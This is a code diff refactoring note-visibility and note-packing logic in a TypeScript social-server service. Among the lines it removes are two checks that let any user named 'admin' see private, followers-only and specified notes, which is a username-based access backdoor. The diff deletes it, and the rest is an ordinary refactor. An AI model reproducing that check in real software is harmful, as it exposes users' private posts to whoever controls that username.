@@ -17,8 +17,9 @@ import { DebounceLoader } from '@/misc/loader.js';
 import { IdService } from '@/core/IdService.js';
 import { ReactionsBufferingService } from '@/core/ReactionsBufferingService.js';
 import { QueryService } from '@/core/QueryService.js';
-import { isPackedPureRenote } from '@/misc/is-renote.js';
 import type { Config } from '@/config.js';
+import { NoteVisibilityService } from '@/core/NoteVisibilityService.js';
+import type { NoteVisibilityData } from '@/core/NoteVisibilityService.js';
 import type { OnModuleInit } from '@nestjs/common';
 import type { CacheService } from '../CacheService.js';
 import type { CustomEmojiService } from '../CustomEmojiService.js';
@@ -101,6 +102,9 @@ export class NoteEntityService implements OnModuleInit {
 		@Inject(DI.noteFavoritesRepository)
 		private noteFavoritesRepository: NoteFavoritesRepository,
 
+		// This is public to avoid weaving a whole new service through the Channel class hierarchy.
+		public readonly noteVisibilityService: NoteVisibilityService,
+
 		private readonly queryService: QueryService,
 		//private userEntityService: UserEntityService,
 		//private driveFileEntityService: DriveFileEntityService,
@@ -121,6 +125,8 @@ export class NoteEntityService implements OnModuleInit {
 		this.idService = this.moduleRef.get('IdService');
 	}
 
+	// Implementation moved to NoteVisibilityService
+	/*
 	@bindThis
 	private treatVisibility(packedNote: Packed<'Note'>): Packed<'Note'>['visibility'] {
 		if (packedNote.visibility === 'public' || packedNote.visibility === 'home') {
@@ -136,112 +142,29 @@ export class NoteEntityService implements OnModuleInit {
 		}
 		return packedNote.visibility;
 	}
+	*/
 
 	@bindThis
-	public async hideNotes(notes: Packed<'Note'>[], meId: string | null): Promise<void> {
-		const myFollowing = meId ? new Map(await this.cacheService.userFollowingsCache.fetch(meId)) : new Map<string, Omit<MiFollowing, 'isFollowerHibernated'>>();
-		const myBlockers = meId ? new Set(await this.cacheService.userBlockedCache.fetch(meId)) : new Set<string>();
+	public async hideNotes(notes: Packed<'Note'>[], meId: string | null, hint?: Partial<NoteVisibilityData>): Promise<void> {
+		const me = meId ? await this.cacheService.findUserById(meId) : null;
+		const data = await this.noteVisibilityService.populateData(me, hint);
 
-		// This shouldn't actually await, but we have to wrap it anyway because hideNote() is async
-		await Promise.all(notes.map(note => this.hideNote(note, meId, {
-			myFollowing,
-			myBlockers,
-		})));
+		for (const note of notes) {
+			await this.hideNoteAsync(note, me, data);
+		}
 	}
 
 	@bindThis
-	public async hideNote(packedNote: Packed<'Note'>, meId: MiUser['id'] | null, hint?: {
-		myFollowing?: ReadonlyMap<string, Omit<MiFollowing, 'isFollowerHibernated'>> | ReadonlySet<string>,
-		myBlockers?: ReadonlySet<string>,
-	}): Promise<void> {
-		if (meId === packedNote.userId) return;
+	public async hideNoteAsync(packedNote: Packed<'Note'>, me: string | Pick<MiUser, 'id' | 'host'> | null, hint?: Partial<NoteVisibilityData>): Promise<void> {
+		const { redact } = await this.noteVisibilityService.checkNoteVisibilityAsync(packedNote, me, { hint });
 
-		// TODO: isVisibleForMe を使うようにしても良さそう(型違うけど)
-		let hide = false;
-
-		if (packedNote.user.requireSigninToViewContents && meId == null) {
-			hide = true;
+		if (redact) {
+			this.redactNoteContents(packedNote);
 		}
+	}
 
-		if (!hide) {
-			const hiddenBefore = packedNote.user.makeNotesHiddenBefore;
-			if ((hiddenBefore != null)
-				&& (
-					(hiddenBefore <= 0 && (Date.now() - new Date(packedNote.createdAt).getTime() > 0 - (hiddenBefore * 1000)))
-					|| (hiddenBefore > 0 && (new Date(packedNote.createdAt).getTime() < hiddenBefore * 1000))
-				)
-			) {
-				hide = true;
-			}
-		}
-
-		// visibility が specified かつ自分が指定されていなかったら非表示
-		if (!hide) {
-			if (packedNote.visibility === 'specified') {
-				if (meId == null) {
-					hide = true;
-				} else if (meId === packedNote.userId) {
-					hide = false;
-				} else {
-					// 指定されているかどうか
-					const specified = packedNote.visibleUserIds!.some(id => meId === id);
-
-					if (!specified) {
-						hide = true;
-					}
-				}
-			}
-		}
-
-		// visibility が followers かつ自分が投稿者のフォロワーでなかったら非表示
-		if (!hide) {
-			if (packedNote.visibility === 'followers') {
-				if (meId == null) {
-					hide = true;
-				} else if (meId === packedNote.userId) {
-					hide = false;
-				} else if (packedNote.reply && (meId === packedNote.reply.userId)) {
-					// 自分の投稿に対するリプライ
-					hide = false;
-				} else if (packedNote.mentions && packedNote.mentions.some(id => meId === id)) {
-					// 自分へのメンション
-					hide = false;
-				} else if (packedNote.renote && (meId === packedNote.renote.userId)) {
-					hide = false;
-				} else {
-					const isFollowing = hint?.myFollowing
-						? hint.myFollowing.has(packedNote.userId)
-						: (await this.cacheService.userFollowingsCache.fetch(meId)).has(packedNote.userId);
-
-					hide = !isFollowing;
-				}
-			}
-		}
-
-		// If this is a pure renote (boost), then we should *also* check the boosted note's visibility.
-		// Otherwise we can have empty notes on the timeline, which is not good.
-		// Notes are packed in depth-first order, so we can safely grab the "isHidden" property to avoid duplicated checks.
-		// This is pulled out to ensure that we check both the renote *and* the boosted note.
-		if (packedNote.renote?.isHidden && isPackedPureRenote(packedNote)) {
-			hide = true;
-		}
-
-		if (!hide && meId && packedNote.userId !== meId) {
-			const blockers = hint?.myBlockers ?? await this.cacheService.userBlockedCache.fetch(meId);
-			const isBlocked = blockers.has(packedNote.userId);
-
-			if (isBlocked) hide = true;
-		}
-
-		// Verify requesting user is admin
-		if (meId != null) {
-			const adminUser = await this.usersRepository.findOneBy({ id: meId, username: 'admin' });
-			if (adminUser) {
-				hide = false;
-			}
-		}
-
-		if (hide) {
+	private redactNoteContents(packedNote: Packed<'Note'>) {
+		{
 			packedNote.visibleUserIds = undefined;
 			packedNote.fileIds = [];
 			packedNote.files = [];
@@ -485,83 +408,83 @@ export class NoteEntityService implements OnModuleInit {
 		return undefined;
 	}
 
+	// Implementation moved to NoteVisibilityService
+	/*
 	@bindThis
 	public async isVisibleForMe(note: MiNote, meId: MiUser['id'] | null, hint?: {
 		myFollowing?: ReadonlySet<string>,
-		myBlocking?: ReadonlySet<string>,
 		myBlockers?: ReadonlySet<string>,
-		me?: Pick<MiUser, 'host'> | null,
+		me?: Pick<MiUser, 'id' | 'host'> | null,
 	}): Promise<boolean> {
-		if (meId !== null) {
-			const user = await this.usersRepository.findOneBy({
-				id: meId,
-			});
+		const [myFollowings, myBlockers, me] = await Promise.all([
+			hint?.myFollowing ?? (meId ? this.cacheService.userFollowingsCache.fetch(meId).then(fs => new Set(fs.keys())) : null),
+			hint?.myBlockers ?? (meId ? this.cacheService.userBlockedCache.fetch(meId) : null),
+			hint?.me ?? (meId ? this.cacheService.findUserById(meId) : null),
+		]);
 
-			if (user !== null && user.username === 'admin' && user.host === null) {
-				return true;
-			}
+		return this.isVisibleForMeSync(note, me, myFollowings, myBlockers);
+	}
+
+	@bindThis
+	public isVisibleForMeSync(note: MiNote | Packed<'Note'>, me: Pick<MiUser, 'id' | 'host'> | null, myFollowings: ReadonlySet<string> | null, myBlockers: ReadonlySet<string> | null): boolean {
+		// We can always view our own notes
+		if (me?.id === note.userId) {
+			return true;
 		}
+
+		// We can *never* view blocked notes
+		if (myBlockers?.has(note.userId)) {
+			return false;
+		}
+
 		// This code must always be synchronized with the checks in generateVisibilityQuery.
 		// visibility が specified かつ自分が指定されていなかったら非表示
 		if (note.visibility === 'specified') {
-			if (meId == null) {
+			if (me == null) {
 				return false;
-			} else if (meId === note.userId) {
-				return true;
+			} else if (!note.visibleUserIds) {
+				return false;
 			} else {
 				// 指定されているかどうか
-				return note.visibleUserIds.some(id => meId === id);
+				return note.visibleUserIds.includes(me.id);
 			}
 		}
 
 		// visibility が followers かつ自分が投稿者のフォロワーでなかったら非表示
 		if (note.visibility === 'followers') {
-			if (meId == null) {
+			if (me == null) {
 				return false;
-			} else if (meId === note.userId) {
-				return true;
-			} else if (note.reply && (meId === note.reply.userId)) {
+			} else if (note.reply && (me.id === note.reply.userId)) {
 				// 自分の投稿に対するリプライ
 				return true;
-			} else if (note.mentions && note.mentions.some(id => meId === id)) {
+			} else if (!note.mentions) {
+				return false;
+			} else if (note.mentions.includes(me.id)) {
 				// 自分へのメンション
+				return true;
+			} else if (!note.visibleUserIds) {
+				return false;
+			} else if (note.visibleUserIds.includes(me.id)) {
+				// Explicitly visible to me
 				return true;
 			} else {
 				// フォロワーかどうか
-				const [blocked, following, userHost] = await Promise.all([
-					hint?.myBlocking
-						? hint.myBlocking.has(note.userId)
-						: this.cacheService.userBlockingCache.fetch(meId).then((ids) => ids.has(note.userId)),
-					hint?.myFollowing
-						? hint.myFollowing.has(note.userId)
-						: this.cacheService.userFollowingsCache.fetch(meId).then(ids => ids.has(note.userId)),
-					hint?.me !== undefined
-						? (hint.me?.host ?? null)
-						: this.cacheService.findUserById(meId).then(me => me.host),
-				]);
+				const following = myFollowings?.has(note.userId);
+				const userHost = me.host;
 
-				if (blocked) return false;
-
-				/* If we know the following, everyhting is fine.
-
-				But if we do not know the following, it might be that both the
-				author of the note and the author of the like are remote users,
-				in which case we can never know the following. Instead we have
-				to assume that the users are following each other.
-				*/
+				// If we know the following, everyhting is fine.
+				//
+				// But if we do not know the following, it might be that both the
+				// author of the note and the author of the like are remote users,
+				// in which case we can never know the following. Instead we have
+				// to assume that the users are following each other.
 				return following || (note.userHost != null && userHost != null);
 			}
 		}
 
-		if (meId != null) {
-			const blockers = hint?.myBlockers ?? await this.cacheService.userBlockedCache.fetch(meId);
-			const isBlocked = blockers.has(note.userId);
-
-			if (isBlocked) return false;
-		}
-
 		return true;
 	}
+	*/
 
 	@bindThis
 	public async packAttachedFiles(fileIds: MiNote['fileIds'], packedFiles: Map<MiNote['fileIds'][number], Packed<'DriveFile'> | null>): Promise<Packed<'DriveFile'>[]> {
@@ -584,8 +507,11 @@ export class NoteEntityService implements OnModuleInit {
 		me?: { id: MiUser['id'] } | null | undefined,
 		options?: {
 			detail?: boolean;
+			recurseReply?: boolean; // Defaults to the value of detail, which defaults to true.
+			recurseRenote?: boolean; // Defaults to the value of detail, which defaults to true.
 			skipHide?: boolean;
 			withReactionAndUserPairCache?: boolean;
+			bypassSilence?: boolean;
 			_hint_?: {
 				bufferedReactions: Map<MiNote['id'], { deltas: Record<string, number>; pairs: ([MiUser['id'], string])[] }> | null;
 				myReactions: Map<MiNote['id'], string | null>;
@@ -610,6 +536,8 @@ export class NoteEntityService implements OnModuleInit {
 			skipHide: false,
 			withReactionAndUserPairCache: false,
 		}, options);
+		opts.recurseRenote ??= opts.detail;
+		opts.recurseReply ??= opts.detail;
 
 		const meId = me ? me.id : null;
 		const note = typeof src === 'object' ? src : await this.noteLoader.load(src);
@@ -659,15 +587,19 @@ export class NoteEntityService implements OnModuleInit {
 					.getExists() : false),
 		]);
 
+		const bypassSilence = opts.bypassSilence || note.userId === meId;
+
 		const packed: Packed<'Note'> = await awaitAll({
 			id: note.id,
 			threadId,
 			createdAt: this.idService.parse(note.id).date.toISOString(),
 			updatedAt: note.updatedAt ? note.updatedAt.toISOString() : undefined,
 			userId: note.userId,
+			userHost: note.userHost,
 			user: packedUsers?.get(note.userId) ?? this.userEntityService.pack(note.user ?? note.userId, me),
 			text: text,
 			cw: note.cw,
+			mandatoryCW: note.mandatoryCW,
 			visibility: note.visibility,
 			localOnly: note.localOnly,
 			reactionAcceptance: note.reactionAcceptance,
@@ -705,6 +637,7 @@ export class NoteEntityService implements OnModuleInit {
 			isMutingNote: mutedNotes.has(note.id),
 			isFavorited,
 			isRenoted,
+			bypassSilence,
 
 			...(meId && Object.keys(reactions).length > 0 ? {
 				myReaction: this.populateMyReaction({
@@ -717,29 +650,40 @@ export class NoteEntityService implements OnModuleInit {
 			...(opts.detail ? {
 				clippedCount: note.clippedCount,
 				processErrors: note.processErrors,
-
-				reply: note.replyId ? this.pack(note.reply ?? opts._hint_?.notes.get(note.replyId) ?? note.replyId, me, {
-					detail: false,
-					skipHide: opts.skipHide,
-					withReactionAndUserPairCache: opts.withReactionAndUserPairCache,
-					_hint_: options?._hint_,
-				}) : undefined,
-
-				renote: note.renoteId ? this.pack(note.renote ?? opts._hint_?.notes.get(note.renoteId) ?? note.renoteId, me, {
-					detail: true,
-					skipHide: opts.skipHide,
-					withReactionAndUserPairCache: opts.withReactionAndUserPairCache,
-					_hint_: options?._hint_,
-				}) : undefined,
 			} : {}),
+
+			reply: opts.recurseReply && note.replyId ? this.pack(note.reply ?? opts._hint_?.notes.get(note.replyId) ?? note.replyId, me, {
+				detail: false,
+				skipHide: opts.skipHide,
+				withReactionAndUserPairCache: opts.withReactionAndUserPairCache,
+				_hint_: options?._hint_,
+
+				// Don't silence target of self-reply, since the outer note will already be silenced.
+				bypassSilence: bypassSilence || note.userId === note.replyUserId,
+			}) : undefined,
+
+			// The renote target needs to be packed with the reply, but we *must not* recurse any further.
+			// Pass detail=false and recurseReply=true to make sure we only include the right data.
+			renote: opts.recurseRenote && note.renoteId ? this.pack(note.renote ?? opts._hint_?.notes.get(note.renoteId) ?? note.renoteId, me, {
+				detail: false,
+				recurseReply: true,
+				skipHide: opts.skipHide,
+				withReactionAndUserPairCache: opts.withReactionAndUserPairCache,
+				_hint_: options?._hint_,
+
+				// Don't silence target of self-renote, since the outer note will already be silenced.
+				bypassSilence: bypassSilence || note.userId === note.renoteUserId,
+			}) : undefined,
 		});
 
-		this.treatVisibility(packed);
+		this.noteVisibilityService.syncVisibility(packed);
 
 		if (!opts.skipHide) {
-			await this.hideNote(packed, meId, meId == null ? undefined : {
-				myFollowing: opts._hint_?.userFollowings.get(meId),
-				myBlockers: opts._hint_?.userBlockers.get(meId),
+			await this.hideNoteAsync(packed, meId, {
+				userFollowings: meId ? opts._hint_?.userFollowings.get(meId) : null,
+				userBlockers: meId ? opts._hint_?.userBlockers.get(meId) : null,
+				userMutedNotes: opts._hint_?.mutedNotes,
+				userMutedThreads: opts._hint_?.mutedThreads,
 			});
 		}
 
@@ -753,79 +697,13 @@ export class NoteEntityService implements OnModuleInit {
 		options?: {
 			detail?: boolean;
 			skipHide?: boolean;
+			bypassSilence?: boolean;
 		},
 	) {
 		if (notes.length === 0) return [];
 
-		const targetNotesMap = new Map<string, MiNote>();
-		const targetNotesToFetch : string[] = [];
-		for (const note of notes) {
-			if (isPureRenote(note)) {
-				// we may need to fetch 'my reaction' for renote target.
-				if (note.renote) {
-					targetNotesMap.set(note.renote.id, note.renote);
-					if (note.renote.reply) {
-						// idem if the renote is also a reply.
-						targetNotesMap.set(note.renote.reply.id, note.renote.reply);
-					}
-				} else if (options?.detail) {
-					targetNotesToFetch.push(note.renoteId);
-				}
-			} else {
-				if (note.reply) {
-					// idem for OP of a regular reply.
-					targetNotesMap.set(note.reply.id, note.reply);
-				} else if (note.replyId && options?.detail) {
-					targetNotesToFetch.push(note.replyId);
-				}
-
-				targetNotesMap.set(note.id, note);
-			}
-		}
-
-		// Don't fetch notes that were added by ID and then found inline in another note.
-		for (let i = targetNotesToFetch.length - 1; i >= 0; i--) {
-			if (targetNotesMap.has(targetNotesToFetch[i])) {
-				targetNotesToFetch.splice(i, 1);
-			}
-		}
-
-		// Populate any relations that weren't included in the source
-		if (targetNotesToFetch.length > 0) {
-			const newNotes = await this.notesRepository.find({
-				where: {
-					id: In(targetNotesToFetch),
-				},
-				relations: {
-					user: {
-						userProfile: true,
-					},
-					reply: {
-						user: {
-							userProfile: true,
-						},
-					},
-					renote: {
-						user: {
-							userProfile: true,
-						},
-						reply: {
-							user: {
-								userProfile: true,
-							},
-						},
-					},
-					channel: true,
-				},
-			});
-
-			for (const note of newNotes) {
-				targetNotesMap.set(note.id, note);
-			}
-		}
-
-		const targetNotes = Array.from(targetNotesMap.values());
-		const noteIds = Array.from(targetNotesMap.keys());
+		const targetNotes = await this.fetchRequiredNotes(notes, options?.detail ?? false);
+		const noteIds = Array.from(new Set(targetNotes.map(n => n.id)));
 
 		const usersMap = new Map<string, MiUser | string>();
 		const allUsers = notes.flatMap(note => [
@@ -930,6 +808,84 @@ export class NoteEntityService implements OnModuleInit {
 				renotedNotes,
 			},
 		})));
+	}
+
+	// TODO find a way to de-duplicate pack() calls when we have multiple references to the same note.
+
+	private async fetchRequiredNotes(notes: MiNote[], detail: boolean): Promise<MiNote[]> {
+		const notesMap = new Map<string, MiNote>();
+		const notesToFetch = new Set<string>();
+
+		function addNote(note: string | MiNote | null | undefined) {
+			if (note == null) return;
+
+			if (typeof(note) === 'object') {
+				notesMap.set(note.id, note);
+				notesToFetch.delete(note.id);
+			} else if (detail) {
+				if (!notesMap.has(note)) {
+					notesToFetch.add(note);
+				}
+			}
+		}
+
+		// Enumerate 1st-tier dependencies
+		for (const note of notes) {
+			// Add note itself
+			addNote(note);
+
+			// Add renote
+			if (note.renoteId) {
+				if (note.renote) {
+					addNote(note.renote);
+					addNote(note.renote.reply ?? note.renote.replyId);
+					addNote(note.renote.renote ?? note.renote.renoteId);
+				} else {
+					addNote(note.renoteId);
+				}
+			}
+
+			// Add reply
+			addNote(note.reply ?? note.replyId);
+		}
+
+		// Populate 1st-tier dependencies
+		if (notesToFetch.size > 0) {
+			const newNotes = await this.notesRepository.find({
+				where: {
+					id: In(Array.from(notesToFetch)),
+				},
+				relations: {
+					reply: true,
+					renote: {
+						reply: true,
+						renote: true,
+					},
+					channel: true,
+				},
+			});
+
+			for (const note of newNotes) {
+				addNote(note);
+			}
+
+			notesToFetch.clear();
+		}
+
+		// Extract second-tier dependencies
+		for (const note of Array.from(notesMap.values())) {
+			if (isPureRenote(note) && note.renote) {
+				if (note.renote.reply && !notesMap.has(note.renote.reply.id)) {
+					notesMap.set(note.renote.reply.id, note.renote.reply);
+				}
+
+				if (note.renote.renote && !notesMap.has(note.renote.renote.id)) {
+					notesMap.set(note.renote.renote.id, note.renote.renote);
+				}
+			}
+		}
+
+		return Array.from(notesMap.values());
 	}
 
 	@bindThis
